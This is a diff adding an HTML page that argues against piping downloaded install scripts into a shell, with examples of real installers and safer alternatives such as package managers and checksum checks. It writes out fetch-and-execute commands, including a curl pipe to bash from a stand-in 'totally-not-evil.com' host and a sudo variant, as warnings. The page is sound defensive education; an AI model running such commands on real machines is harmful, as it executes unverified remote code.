@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>No curl | bash — Don't pipe the internet into your shell</title>
+  <meta name="description" content="A reference page explaining why curl | bash is dangerous and what to do instead.">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #ffffff;
+      --surface: #f5f5f5;
+      --text: #111111;
+      --muted: #666666;
+      --red: #cc2200;
+      --red-bg: #fff0ee;
+      --green: #1a7a2e;
+      --green-bg: #f0fff4;
+      --yellow: #7a5c00;
+      --yellow-bg: #fffbea;
+      --term-bg: #16161e;
+      --term-text: #c0caf5;
+      --term-comment: #565f89;
+      --term-green: #9ece6a;
+      --term-red: #f7768e;
+      --term-yellow: #e0af68;
+      --term-cyan: #7dcfff;
+      --border: #e0e0e0;
+      --radius: 6px;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      font-size: 16px;
+    }
+
+    .container {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    header {
+      border-bottom: 2px solid var(--text);
+      padding: 56px 0 44px;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: var(--red-bg);
+      border: 1.5px solid var(--red);
+      color: var(--red);
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 24px;
+    }
+
+    h1 {
+      font-size: clamp(2rem, 6vw, 3.2rem);
+      font-weight: 800;
+      line-height: 1.1;
+      letter-spacing: -0.02em;
+      margin-bottom: 18px;
+    }
+
+    h1 code {
+      font-family: "SF Mono", "Fira Code", "Cascadia Code", monospace;
+      background: var(--term-bg);
+      color: var(--term-red);
+      padding: 2px 10px;
+      border-radius: 4px;
+      font-size: 0.82em;
+    }
+
+    .tagline {
+      font-size: 1.1rem;
+      color: var(--muted);
+      max-width: 540px;
+      line-height: 1.65;
+    }
+
+    section {
+      padding: 52px 0;
+      border-bottom: 1px solid var(--border);
+    }
+
+    h2 {
+      font-size: 0.75rem;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--muted);
+      margin-bottom: 28px;
+    }
+
+    p { line-height: 1.65; }
+
+    code {
+      font-family: "SF Mono", "Fira Code", "Cascadia Code", monospace;
+      font-size: 0.88em;
+      background: var(--surface);
+      padding: 1px 5px;
+      border-radius: 3px;
+    }
+
+    .term {
+      background: var(--term-bg);
+      border-radius: var(--radius);
+      padding: 20px 24px;
+      font-family: "SF Mono", "Fira Code", "Cascadia Code", "Courier New", monospace;
+      font-size: 13.5px;
+      line-height: 1.8;
+      overflow-x: auto;
+      margin: 20px 0;
+    }
+
+    .term .prompt { color: var(--term-green); user-select: none; }
+    .term .cmd    { color: var(--term-text); }
+    .term .flag   { color: var(--term-cyan); }
+    .term .url    { color: var(--term-yellow); }
+    .term .pipe   { color: var(--term-red); font-weight: bold; }
+    .term .cmt    { color: var(--term-comment); }
+    .term .out    { color: var(--term-comment); font-style: italic; }
+
+    .reasons {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      margin-top: 8px;
+    }
+
+    .reasons li {
+      display: grid;
+      grid-template-columns: 36px 1fr;
+      gap: 14px;
+      align-items: start;
+    }
+
+    .reasons .icon {
+      font-size: 1.3rem;
+      padding-top: 2px;
+      text-align: center;
+    }
+
+    .reasons .body strong {
+      display: block;
+      font-weight: 700;
+      margin-bottom: 5px;
+    }
+
+    .reasons .body p {
+      color: var(--muted);
+      font-size: 0.93rem;
+    }
+
+    .examples {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .example {
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+    }
+
+    .example-header {
+      background: var(--surface);
+      padding: 9px 14px;
+      font-size: 12.5px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid var(--border);
+      flex-wrap: wrap;
+    }
+
+    .example-header .tool {
+      font-family: "SF Mono", "Fira Code", monospace;
+      font-weight: 400;
+      color: var(--muted);
+      margin-left: auto;
+      font-size: 12px;
+    }
+
+    .example-body {
+      padding: 12px 16px;
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.55;
+    }
+
+    .example-body strong { color: var(--text); }
+
+    .tag {
+      display: inline-block;
+      padding: 2px 7px;
+      border-radius: 3px;
+      font-size: 10.5px;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+
+    .tag.danger { background: var(--red-bg);    color: var(--red);    border: 1px solid #f5bdb3; }
+    .tag.warn   { background: var(--yellow-bg); color: var(--yellow); border: 1px solid #e8d48a; }
+
+    .lead {
+      color: var(--muted);
+      font-size: 0.93rem;
+      margin-bottom: 20px;
+    }
+
+    .alternatives {
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+    }
+
+    .alt h3 {
+      font-size: 1rem;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .alt > p {
+      font-size: 0.92rem;
+      color: var(--muted);
+      margin-bottom: 10px;
+    }
+
+    .callout {
+      border-left: 3px solid;
+      padding: 12px 16px;
+      border-radius: 0 var(--radius) var(--radius) 0;
+      margin-top: 12px;
+      font-size: 0.88rem;
+      line-height: 1.55;
+    }
+
+    .callout.warn {
+      border-color: var(--yellow);
+      background: var(--yellow-bg);
+      color: var(--yellow);
+    }
+
+    .callout strong { display: block; margin-bottom: 3px; }
+
+    footer {
+      padding: 40px 0 48px;
+      font-size: 0.85rem;
+      color: var(--muted);
+      line-height: 1.9;
+    }
+
+    footer a {
+      color: var(--text);
+      text-decoration: underline;
+      text-underline-offset: 3px;
+    }
+
+    footer a:hover { color: var(--red); }
+
+    @media (max-width: 480px) {
+      header { padding: 36px 0 32px; }
+      section { padding: 36px 0; }
+      .example-header .tool { margin-left: 0; width: 100%; margin-top: 4px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <header>
+      <div class="badge">&#9888; Security Anti-Pattern</div>
+      <h1>Stop <code>curl | bash</code></h1>
+      <p class="tagline">You wouldn't run a stranger's code without reading it. Yet every second developer docs page ends with this command.</p>
+    </header>
+
+    <section>
+      <h2>The Problem</h2>
+      <p>This is the command in question:</p>
+      <div class="term">
+        <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://totally-not-evil.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash</span>
+      </div>
+      <p>It downloads a shell script from the internet and immediately executes it. You have no idea what runs. Neither does your team. Neither does your audit log.</p>
+    </section>
+
+    <section>
+      <h2>Why It's Bad</h2>
+      <ul class="reasons">
+        <li>
+          <span class="icon">&#9889;</span>
+          <div class="body">
+            <strong>Bash starts before the download finishes</strong>
+            <p>The pipe is live. Bash receives and executes lines as they arrive. If your connection drops mid-script, you get partial execution &#8212; commands ran, cleanup didn't.</p>
+          </div>
+        </li>
+        <li>
+          <span class="icon">&#127917;</span>
+          <div class="body">
+            <strong>The server knows you're piping</strong>
+            <p>A server can detect curl's User-Agent or response-read timing and serve different content to a pipe than to a browser. Verifying the script in your browser doesn't mean you ran that script.</p>
+          </div>
+        </li>
+        <li>
+          <span class="icon">&#128274;</span>
+          <div class="body">
+            <strong>No integrity verification</strong>
+            <p>No checksum, no signature. You're trusting DNS, TLS, the CDN, and the origin server simultaneously. A compromised CDN or BGP hijack serves you malware &#8212; silently.</p>
+          </div>
+        </li>
+        <li>
+          <span class="icon">&#128249;</span>
+          <div class="body">
+            <strong>You can't reproduce what ran</strong>
+            <p>The URL is live and mutable. The script changes without notice. There is no record of what exactly executed on your machine &#8212; only that <em>something</em> did.</p>
+          </div>
+        </li>
+        <li>
+          <span class="icon">&#128273;</span>
+          <div class="body">
+            <strong>Add <code>sudo</code> and it's game over</strong>
+            <p><code>curl ... | sudo bash</code> hands root access to whoever controls that URL at that moment. This pattern appears in real published docs. Often.</p>
+          </div>
+        </li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>From the Wild</h2>
+      <p class="lead">Real install scripts, analyzed in June 2026. These are not hypothetical threats.</p>
+      <div class="examples">
+
+        <div class="example">
+          <div class="example-header">
+            <span class="tag danger">sudo</span>
+            <span class="tag danger">no checksum</span>
+            <span class="tool">get.jetify.com/devbox</span>
+          </div>
+          <div class="example-body">
+            Downloads a binary and installs it to <strong>/usr/local/bin via sudo</strong> with no integrity check. Silently installs a full Nix store (potentially gigabytes) if Nix is absent. Also follows a redirect chain between two domains.
+          </div>
+        </div>
+
+        <div class="example">
+          <div class="example-header">
+            <span class="tag danger">live dev branch</span>
+            <span class="tag danger">no checksum</span>
+            <span class="tool">opencode.ai/install</span>
+          </div>
+          <div class="example-body">
+            Redirects to <strong>a live <code>dev</code> branch on GitHub</strong> &#8212; no tags, no version pinning. The script changes with every commit. What ran yesterday is not what runs today.
+          </div>
+        </div>
+
+        <div class="example">
+          <div class="example-header">
+            <span class="tag warn">no checksum</span>
+            <span class="tag warn">sudo possible</span>
+            <span class="tool">hermes-agent.nousresearch.com/install.sh</span>
+          </div>
+          <div class="example-body">
+            Pulls Python 3.11, Node.js, Playwright, and Chromium (~300 MB). May invoke sudo to install system packages via apt or Homebrew. After <code>rm -rf ~/.hermes/</code>, system-level traces remain.
+          </div>
+        </div>
+
+        <div class="example">
+          <div class="example-header">
+            <span class="tag warn">closed CDN</span>
+            <span class="tag warn">no checksum</span>
+            <span class="tool">mimo.xiaomi.com/install</span>
+          </div>
+          <div class="example-body">
+            Downloads from Xiaomi's internal CDN (<code>mi-fds.com</code>). No public git history, no checksum. You're trusting an opaque proprietary distribution system with no way to verify what you got.
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <section>
+      <h2>Do This Instead</h2>
+      <div class="alternatives">
+
+        <div class="alt">
+          <h3>1. Use a real package manager</h3>
+          <p>The boring option is usually the right one. Package managers handle integrity, updates, and uninstallation.</p>
+          <div class="term">
+            <span class="cmt"># macOS</span><br>
+            <span class="prompt">$ </span><span class="cmd">brew install</span> <span class="url">sometool</span><br>
+            <br>
+            <span class="cmt"># Ubuntu / Debian</span><br>
+            <span class="prompt">$ </span><span class="cmd">sudo apt install</span> <span class="url">sometool</span><br>
+            <br>
+            <span class="cmt"># Node</span><br>
+            <span class="prompt">$ </span><span class="cmd">npm install -g</span> <span class="url">sometool</span>
+          </div>
+        </div>
+
+        <div class="alt">
+          <h3>2. Download, inspect, then run</h3>
+          <p>One extra step. Gives you a chance to read the script and keeps a local copy for future reference.</p>
+          <div class="term">
+            <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
+            <span class="prompt">$ </span><span class="cmd">cat</span> <span class="url">install.sh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="cmt"># actually read it</span><br>
+            <span class="prompt">$ </span><span class="cmd">bash</span> <span class="url">install.sh</span>
+          </div>
+        </div>
+
+        <div class="alt">
+          <h3>3. Log everything that executes</h3>
+          <p>If you must pipe &#8212; record what ran so you can audit or undo later.</p>
+          <div class="term">
+            <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="pipe">|</span> <span class="cmd">bash -x</span> <span class="flag">2&gt;&amp;1</span> <span class="pipe">|</span> <span class="cmd">tee</span> <span class="url">install.log</span>
+          </div>
+          <div class="callout warn">
+            <strong>Caveat</strong>
+            <code>bash -x</code> traces top-level commands only. Subprocesses and sourced scripts won't appear in the log.
+          </div>
+        </div>
+
+        <div class="alt">
+          <h3>4. Verify the checksum</h3>
+          <p>If the project publishes a SHA-256 hash, verify it before running. Non-negotiable on production machines.</p>
+          <div class="term">
+            <span class="prompt">$ </span><span class="cmd">curl</span> <span class="flag">-fsSL</span> <span class="url">https://example.com/install.sh</span> <span class="flag">-o</span> <span class="url">install.sh</span><br>
+            <span class="prompt">$ </span><span class="cmd">echo</span> <span class="url">"abc123&#8230;expectedhash&nbsp;&nbsp;install.sh"</span> <span class="pipe">|</span> <span class="cmd">sha256sum -c</span><br>
+            <span class="out">install.sh: OK</span><br>
+            <span class="prompt">$ </span><span class="cmd">bash</span> <span class="url">install.sh</span>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <footer>
+      <p>Inspired by <a href="https://nohello.net/en/" target="_blank" rel="noopener">nohello.net</a> and <a href="https://noslopgrenade.com/" target="_blank" rel="noopener">noslopgrenade.com</a> &#8212; single-purpose pages that name common anti-patterns so you can link instead of explain.</p>
+      <p>Share this page next time someone pastes a <code>curl | bash</code> in your team chat.</p>
+    </footer>
+
+  </div>
+</body>
+</html>
